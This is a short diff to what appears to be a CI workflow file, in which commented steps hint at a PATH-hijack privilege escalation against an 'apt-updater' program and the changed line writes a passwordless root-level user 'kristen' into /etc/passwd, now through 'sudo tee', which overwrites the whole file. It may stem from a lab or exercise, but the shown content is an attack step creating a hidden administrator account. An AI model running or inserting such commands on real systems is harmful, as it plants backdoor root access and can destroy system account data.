@@ -70,5 +70,5 @@ jobs:
         # & execute the vulnerable program
         # PATH=/tmp/foo:$PATH /usr/local/bin/apt-updater 
         id # root?
-        echo “kristen::0:0:System Administrator:/root/root:/bin/bash” >> /etc/passwd
+        echo “kristen::0:0:System Administrator:/root/root:/bin/bash” | sudo tee /etc/passwd
         id
